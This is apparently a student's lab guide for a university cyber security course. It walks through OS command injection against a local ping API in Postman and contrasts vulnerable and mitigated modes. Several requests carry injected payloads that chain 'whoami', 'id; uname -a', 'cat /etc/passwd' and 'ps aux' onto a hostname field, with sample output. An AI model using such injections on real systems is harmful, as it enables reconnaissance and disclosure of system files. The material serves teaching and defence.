# OS Command Injection — Postman Walkthrough & Demonstration Guide

> **Course:** Cyber Security (IT-30001) | IIITA | Autumn 2026  
> **Instructor:** Dr. Soumyadev Maity  
> **Category:** OS Command Injection | **Variant 1:** In-Band (Command output returned)  
> **Testing Tool:** Postman GUI

---

## 🚀 Part 0: Start Your Backend Web Server

Before using Postman, ensure the backend diagnostic service is running.

Open your terminal and run:
```bash
cd /home/varun/os-command-injection-assignment
./run.sh
```

You should see:
```text
======================================================================
  IIITA Cyber Security Lab (IT-30001) - OS Command Injection
  Server starting on http://127.0.0.1:5000
======================================================================
 * Running on http://127.0.0.1:5000
```
> **Keep this terminal running in the background.**

---

## 📥 Part 1: Open Postman & Import the Pre-Built Collection

1. Launch Postman:
   ```bash
   postman &
   ```
2. In Postman, click the **Import** button in the top-left corner.
3. Select or drag & drop the pre-configured collection file:
   ```
   /home/varun/os-command-injection-assignment/postman_collection.json
   ```
4. Click **Import**.

You will now see a collection in your left sidebar titled:  
**`OS Command Injection Lab (IT-30001)`** with all 8 requests ready to execute.

---

## ⚡ Part 2: Vulnerable Mode Demonstrations (In-Band Exploitation)

Select each request from the imported collection in order, or follow the configurations below.

---

### Request 1: Benign Baseline Request (Normal Operation)

* **Collection Item:** `1. Vulnerable - Benign Request`
* **Method:** `POST`
* **URL:** `http://127.0.0.1:5000/api/ping`
* **Headers:** `Content-Type: application/json`
* **Body (raw JSON):**
  ```json
  {
    "target": "127.0.0.1",
    "mode": "vulnerable"
  }
  ```
* **Action:** Click **Send**.
* **Expected Status:** `200 OK`
* **Response Body (in-band output):**
  ```json
  {
    "status": "success",
    "mode": "vulnerable",
    "executed_command": "ping -c 2 127.0.0.1",
    "output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n...\n2 packets transmitted, 2 received, 0% packet loss\n",
    "returncode": 0
  }
  ```
* **Explanation:** Normal ping functionality. No attack payload entered.

---

### Request 2: Exploit 1 — Current User Extraction (`whoami`)

* **Collection Item:** `2. Vulnerable - Exploit whoami`
* **Method:** `POST`
* **URL:** `http://127.0.0.1:5000/api/ping`
* **Body (raw JSON):**
  ```json
  {
    "target": "127.0.0.1; whoami",
    "mode": "vulnerable"
  }
  ```
* **Action:** Click **Send**.
* **Expected Status:** `200 OK`
* **Response Body:**
  ```json
  {
    "status": "success",
    "mode": "vulnerable",
    "executed_command": "ping -c 2 127.0.0.1; whoami",
    "output": "PING 127.0.0.1 ... 2 packets transmitted, 2 received, 0% packet loss ...\nvarun\n",
    "returncode": 0
  }
  ```
* **What Just Happened:** The semicolon `;` acts as a command delimiter in `/bin/sh`. The server executed `whoami` after `ping` and returned the username `varun` directly in the JSON response (**In-Band output**).

---

### Request 3: Exploit 2 — System Reconnaissance (`id; uname -a`)

* **Collection Item:** `3. Vulnerable - Exploit id & uname -a`
* **Method:** `POST`
* **URL:** `http://127.0.0.1:5000/api/ping`
* **Body (raw JSON):**
  ```json
  {
    "target": "127.0.0.1; id; uname -a",
    "mode": "vulnerable"
  }
  ```
* **Action:** Click **Send**.
* **Expected Status:** `200 OK`
* **Response Body (In-Band Evidence):**
  ```text
  ...
  uid=1000(varun) gid=982(users) groups=982(users),959(docker),963(ollama),998(wheel)
  Linux archlinux 6.12.1-arch1-1 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
  ```
* **What This Proves:** An attacker has enumerated the user privileges, group memberships, kernel version, and architecture of the server host.

---

### Request 4: Exploit 3 — Arbitrary File Read (`/etc/passwd`)

* **Collection Item:** `4. Vulnerable - Exploit cat passwd`
* **Method:** `POST`
* **URL:** `http://127.0.0.1:5000/api/ping`
* **Body (raw JSON):**
  ```json
  {
    "target": "127.0.0.1; cat /etc/passwd | head -5",
    "mode": "vulnerable"
  }
  ```
* **Action:** Click **Send**.
* **Expected Status:** `200 OK`
* **Response Body (In-Band Evidence):**
  ```text
  root:x:0:0::/root:/bin/bash
  bin:x:1:1::/:/usr/bin/nologin
  daemon:x:2:2::/:/usr/bin/nologin
  mail:x:8:12::/var/spool/mail:/usr/bin/nologin
  ftp:x:14:11::/srv/ftp:/usr/bin/nologin
  ```
* **Impact:** Sensitive system file disclosure. The attacker has dumped the system user account registry.

---

### Request 5: Exploit 4 — Process Enumeration (`ps aux`)

* **Collection Item:** `5. Vulnerable - Exploit ps aux`
* **Method:** `POST`
* **URL:** `http://127.0.0.1:5000/api/ping`
* **Body (raw JSON):**
  ```json
  {
    "target": "127.0.0.1 && ps aux | head -6",
    "mode": "vulnerable"
  }
  ```
* **Action:** Click **Send**.
* **Expected Status:** `200 OK`
* **Observation:** The `&&` conditional operator also triggers injection, returning active system processes.

---

## 🛡️ Part 3: Mitigated Mode Demonstrations (Defense in Action)

Now test the exact same exploit payloads with `"mode": "mitigated"`.

---

### Request 6: Mitigated Defense Test — `whoami` Blocked

* **Collection Item:** `6. Mitigated - Blocked Exploit whoami`
* **Method:** `POST`
* **URL:** `http://127.0.0.1:5000/api/ping`
* **Body (raw JSON):**
  ```json
  {
    "target": "127.0.0.1; whoami",
    "mode": "mitigated"
  }
  ```
* **Action:** Click **Send**.
* **Expected Status:** **`400 BAD REQUEST`** 🔴
* **Response Body:**
  ```json
  {
    "status": "blocked",
    "mode": "mitigated",
    "executed_command": null,
    "message": "SECURITY ALERT: Request blocked by allow-list filter. Shell metacharacters or invalid hostnames are strictly prohibited.",
    "output": "[SECURITY_FILTER_TRIGGERED] Input '127.0.0.1; whoami' rejected by allow-list pattern r'^[a-zA-Z0-9.-]+$'."
  }
  ```
* **Why It Was Blocked:**
  1. **Layer 1 (Allow-List Regex):** The regex `^[a-zA-Z0-9.-]+$` rejected `;` and space characters.
  2. **Layer 2 (Parameterized Execution):** Uses `shell=False` with `cmd_args = ["ping", "-c", "2", target]` so no shell interpreter is ever spawned.

---

### Request 7: Mitigated Defense Test — Reconnaissance Blocked

* **Collection Item:** `7. Mitigated - Blocked Exploit id & uname`
* **Method:** `POST`
* **URL:** `http://127.0.0.1:5000/api/ping`
* **Body (raw JSON):**
  ```json
  {
    "target": "127.0.0.1; id; uname -a",
    "mode": "mitigated"
  }
  ```
* **Action:** Click **Send**.
* **Expected Status:** **`400 BAD REQUEST`** 🔴
* **Result:** Blocked immediately. Zero command execution occurs on the server.

---

### Request 8: Mitigated Functional Test — Legitimate Ping Allowed

* **Collection Item:** `8. Mitigated - Legitimate Ping Allowed`
* **Method:** `POST`
* **URL:** `http://127.0.0.1:5000/api/ping`
* **Body (raw JSON):**
  ```json
  {
    "target": "127.0.0.1",
    "mode": "mitigated"
  }
  ```
* **Action:** Click **Send**.
* **Expected Status:** **`200 OK`** 🟢
* **Response Body:**
  ```json
  {
    "status": "success",
    "mode": "mitigated",
    "executed_command": "ping -c 2 127.0.0.1",
    "output": "PING 127.0.0.1 ... 2 packets transmitted, 2 received, 0% packet loss ...",
    "returncode": 0
  }
  ```
* **What This Proves:** The mitigation does not break legitimate business functionality. Safe hostnames pass the allow-list filter and execute properly.

---

## 📊 Summary Table of Postman Requests

| # | Request Name | Mode | Payload | Expected HTTP Status | Security Outcome |
|:---|:---|:---|:---|:---:|:---|
| 1 | Benign Request | `vulnerable` | `127.0.0.1` | `200 OK` | Normal ping executed |
| 2 | Exploit whoami | `vulnerable` | `127.0.0.1; whoami` | `200 OK` | ⚠️ **In-Band Exploit**: Username returned |
| 3 | Exploit id & uname | `vulnerable` | `127.0.0.1; id; uname -a` | `200 OK` | ⚠️ **In-Band Exploit**: User IDs & kernel info returned |
| 4 | Exploit cat passwd | `vulnerable` | `127.0.0.1; cat /etc/passwd \| head -5` | `200 OK` | ⚠️ **In-Band Exploit**: File contents leaked |
| 5 | Exploit ps aux | `vulnerable` | `127.0.0.1 && ps aux \| head -6` | `200 OK` | ⚠️ **In-Band Exploit**: Process listing returned |
| 6 | Blocked whoami | `mitigated` | `127.0.0.1; whoami` | **`400 Bad Request`** | 🛡️ **Blocked by security filter** |
| 7 | Blocked id & uname | `mitigated` | `127.0.0.1; id; uname -a` | **`400 Bad Request`** | 🛡️ **Blocked by security filter** |
| 8 | Legitimate Ping | `mitigated` | `127.0.0.1` | `200 OK` | 🟢 Legitimate input passes safely |

---

## 🎥 Video Recording Guide (Using Postman)

When recording your 2.5-minute video demonstration:
1. **[0:00 - 0:25] Intro:** Introduce yourself (Varun, IIT2024150, IT-30001 Cyber Security, OS Command Injection, Variant 1 In-Band).
2. **[0:25 - 0:50] Vulnerable Code:** Briefly show `app.py` lines 36–45 (`f"ping -c 2 {target}"`, `shell=True`).
3. **[0:50 - 1:30] Postman Exploit Demo:**
   - In Postman, fire **Request 1** (`127.0.0.1`) → show normal `200 OK`.
   - Fire **Request 2** (`127.0.0.1; whoami`) → point out the injected username `varun` in the response body!
   - Fire **Request 3** (`127.0.0.1; id; uname -a`) → point out `uid=1000` and the Linux kernel version.
4. **[1:30 - 2:05] Postman Mitigation Demo:**
   - Switch to **Request 6** (`mode: mitigated` with `127.0.0.1; whoami`).
   - Click **Send** → Highlight the red **`400 Bad Request`** badge and the `SECURITY ALERT` message.
   - Fire **Request 8** (`127.0.0.1` in mitigated mode) → show that legitimate requests still get `200 OK`.
5. **[2:05 - 2:30] Theory Recap:** State the 4 defenses from slides (Avoid the shell, Parameterized execution via `shell=False`, Allow-list regex, Principle of Least Privilege).
